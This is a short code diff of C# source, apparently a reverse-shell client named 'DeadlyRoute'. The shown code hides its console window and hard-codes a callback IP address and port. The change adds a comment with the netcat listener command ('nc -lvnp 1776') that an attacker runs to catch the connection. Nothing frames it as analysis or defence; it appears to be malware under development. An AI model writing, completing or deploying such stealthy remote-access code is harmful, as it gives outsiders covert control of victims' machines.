@@ -32,7 +32,7 @@ namespace DeadlyRoute
             ShowWindow(handle, SW_HIDE);
 
             string ip = "192.168.1.182";
-            int port = 1776;
+            int port = 1776; // nc -lvnp 1776
 
             try
             {
@@ -92,6 +92,5 @@ namespace DeadlyRoute
                 }
             }
         }
-
     }
 }
